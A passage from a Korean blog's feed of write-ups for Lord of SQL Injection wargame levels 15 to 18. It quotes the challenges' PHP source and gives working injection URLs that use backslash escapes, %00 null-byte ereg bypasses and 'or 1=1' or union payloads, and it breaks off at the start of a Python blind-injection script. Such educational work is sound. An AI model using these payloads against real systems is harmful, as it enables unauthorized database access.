가져오는 WHERE절을 구성할 수 있다.<br><code>%2b</code>는 <code>+</code>이다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/nightmare_ce407ee88ba848c2bec8e42aaeaa6ad4.php?pw=&apos;%2b0);%00</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_nightmare <span class="keyword">where</span> pw=(<span class="string">''</span>+<span class="number">0</span>);') and id!='admin'</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 18번 nightmare 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.17 Succubus</title>
    <link href="https://www.jslee.me/2019/09/07/los-write-up-17-succubus/"/>
    <id>https://www.jslee.me/2019/09/07/los-write-up-17-succubus/</id>
    <published>2019-09-07T12:58:07.000Z</published>
    <updated>2019-09-17T06:08:17.183Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 17번 succubus 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>\</code>(백슬래시) 문자를 이용하여 SQL Injection을 할 수 있는지 확인한다.</p><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>succubus 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_succubus where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"succubus"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>id</code>와 <code>pw</code>를 받고, <code>id</code>나 <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, 이번엔 <code>preg_match</code> 함수를 써서 <code>id</code>나 <code>pw</code>에 <code>&#39;</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_succubus where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"succubus"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 참이 되는 어떤 문자열이든 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>문자 Escape 이용</p><p>바로 전 단계 문제와 유사하나 이번에는 <code>&#39;</code>을 <code>preg_match</code> 함수로 필터링하여 우회하기 어렵게 만들었다.<br>따라서 이번에는 함수를 우회하기보다 SQL문이 문자열로 인식하는 부분을 우회하여 풀면 편하다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><p>필터링하는 부분을 보면 <code>\</code>, 즉 백슬래시는 필터링하지 않고 있다.<br>SQL문에서 <code>\</code>를 이용하여 <code>&#39;</code>, <code>&quot;</code>, <code>`</code> 등을 이스케이프 해 주면 문자열에서 쓸 수 있게 인식한다.<br>따라서 id 입력값으로 <code>\</code>, pw 입력값으로 <code>or 1=1-- -</code> 과 같이 <code>and pw=</code>가 문자열로 인식되고 그 후 <code>&#39; or 1=1-- -</code>이 SQL문으로써 작동하도록 하면 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/succubus_8ab2d195be2e0b10a3b5aa2873d0863f.php?id=\&amp;pw= or 1=1-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_succubus <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'\' and pw='</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">-- -'</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 17번 succubus 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.16 Zombie Assassin</title>
    <link href="https://www.jslee.me/2019/09/01/los-write-up-16-zombie-assassin/"/>
    <id>https://www.jslee.me/2019/09/01/los-write-up-16-zombie-assassin/</id>
    <published>2019-09-01T11:47:20.000Z</published>
    <updated>2019-09-17T06:08:17.183Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 16번 zombie-assassin 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>을 필터링하는 <code>ereg()</code> 함수를 우회하여 SQL Injection을 할 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a>ereg</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int ereg ( string $pattern , string $string [, <span class="keyword">array</span> &amp;$regs ] )</span><br></pre></td></tr></table></figure><ul><li>이미 8번 Troll 문제에서 대소문자 구분 관련 취약점이 밝혀진 <code>ereg</code> 함수이다.</li><li>하지만 <code>ereg</code> 함수가 PHP 5.3+ 부터 더 이상 쓰이지 않게 된 이유는 대소문자 구분 때문이 아니다.</li><li><code>ereg</code> 함수는 POSIX Regex 함수의 하나로 PHP 5.3+ 버전에서 <code>NULL</code>문자를 만나면 더 이상 뒤의 문자열을 체크하지 않는 취약점을 가지고 있다.</li><li>php의 <code>ereg</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.ereg.php" target="_blank" rel="noopener">PHP: ereg - Manual</a></li><li>POSIX Regex 함수의 취약점에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://blog.do9.kr/entry/POSIX-Regex%EC%99%80-PCRE-Regex" target="_blank" rel="noopener">POSIX Regex와 PCRE Regex</a></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>zombie_assassin 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\\\|prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\\\|prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(@ereg(<span class="string">"'"</span>,$_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(@ereg(<span class="string">"'"</span>,$_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_zombie_assassin where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"zombie_assassin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\\\|prob|_|\.|\(\)/i'</span>, $_GET[id])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\\\|prob|_|\.|\(\)/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(@ereg(<span class="string">"'"</span>,$_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(@ereg(<span class="string">"'"</span>,$_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>id</code>와 <code>pw</code>를 받고, <code>id</code>나 <code>pw</code>에 <code>\</code>, <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>id</code>나 <code>pw</code>에 <code>&#39;</code> 이 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_zombie_assassin where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"zombie_assassin"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>id</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 참이 되는 어떤 문자열이든 들어있음’이다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>NULL 문자 이용</p><p>PHP의 <code>ereg()</code> 함수 부분을 보면</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@ereg(<span class="string">"'"</span>,$_GET[id])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(@ereg(<span class="string">"'"</span>,$_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><p><code>ereg()</code> 함수는 <code>NULL</code> 문자를 만나면 더 이상 뒤의 문자열을 체크하지 않는다.</p><p><code>NULL</code> 문자는 URL Encoding을 하면 <code>%00</code>이 된다.</p><p>따라서 입력값으로 <code>%00&#39; union select 1-- -</code>, <code>%00&#39; or 1=1-- -</code> 과 같이 <code>NULL</code> 문자가 <code>&#39;</code> 앞에 오도록 값을 넣으면 <code>ereg()</code> 함수에서 필터링이 이루어지지 않으며, SQL문을 적당히 조작하여 값이 반환되도록 하면 문제가 풀리게 된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?id=%00&apos; union select 1-- -</span><br><span class="line">http://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?id=%00&apos; or 1=1-- -</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_zombie_assassin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span><span class="comment">-- -' and pw=''</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> prob_zombie_assassin <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">-- -' and pw=''</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 16번 zombie-assassin 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.15 Assassin</title>
    <link href="https://www.jslee.me/2019/08/31/los-write-up-15-assassin/"/>
    <id>https://www.jslee.me/2019/08/31/los-write-up-15-assassin/</id>
    <published>2019-08-31T11:34:41.000Z</published>
    <updated>2019-09-17T06:08:17.183Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 15번 assassin 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>LIKE</code> 연산자 뒤에 오는 문자열에 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="SQL-패턴-매칭"><a href="#SQL-패턴-매칭" class="headerlink" title="SQL 패턴 매칭"></a>SQL 패턴 매칭</h4><ul><li>MySQL은 유닉스 유틸리티가 사용하는 <code>vi</code>, <code>grep</code>, 및 <code>sed</code>등과 유사한 확장된 규칙 수식 (extended regular expression)에 근거한 패턴 매칭 형식 뿐만 아니라 표준 SQL 패턴 매칭도 함께 제공한다.</li><li>SQL 패턴 매칭에서 <code>_</code>를 사용해서 단일 문자를 매칭시킬 수 있고 <code>%</code>를 사용해서 정해지지 않은 개수의 문자를 매칭 시킬 수 있다.</li><li>SQL 패턴은 디폴트로 <strong>대소 문자를 구분하지 않는다</strong>.</li><li>SQL패턴을 사용할 때에는 <code>=</code> 또는 <code>&lt;&gt;</code>는 사용할 수 없다. <code>LIKE</code> 또는 <code>NOT LIKE</code> 를 대신 사용한다.</li><li>MySQL의 패턴 매칭에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://www.mysqlkorea.com/sub.html?mcode=manual&scode=01&m_no=20156&cat1=3&cat2=91&cat3=102&lang=k" target="_blank" rel="noopener">3.3.4.7. 패턴 매칭 - :::MySQL Korea:::</a></li></ul><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>assassin 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_assassin where pw like '&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"assassin"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>No Hack ~_~</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_assassin where pw like '&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"assassin"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>id</code>에 <code>&quot;admin&quot;</code>이라는 값이 들어있음’이다.</li><li><code>pw</code>가 <code>&#39;</code>로 둘러싸여 있고 <code>&#39;</code>는 필터링 되므로 <code>LIKE</code> 연산자 뒤에 오는 문자열에 Blind SQL Injection을 하여 <code>pw</code>를 직접 알아내서 푸는 방법을 사용한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>와일드카드 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> 